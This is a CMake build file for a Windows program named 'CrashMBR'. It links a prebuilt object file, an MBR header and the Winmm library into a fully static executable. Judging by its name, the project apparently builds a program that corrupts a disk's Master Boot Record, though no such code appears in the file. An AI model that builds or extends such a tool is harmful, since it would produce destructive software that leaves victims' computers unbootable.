cmake_minimum_required(VERSION 3.0)
set (CMAKE_CXX_STANDARD 17)
set (CMAKE_CXX_STANDARD_REQUIRED ON)
set (CMAKE_CXX_FLAGS "-std=c++17 -static -static-libgcc -static-libstdc++")
set (CMAKE_EXE_LINKER_FLAGS "-static -static-libgcc -static-libstdc++")

project(CrashMBR)

include_directories(./inc)

set(SRCS
src/main.cpp
src/binary.o
inc/mbr.hpp
)

add_executable(CrashMBR WIN32 ${SRCS} ${HEADERS})
TARGET_LINK_LIBRARIES(CrashMBR Winmm "-static -static-libgcc -static-libstdc++")
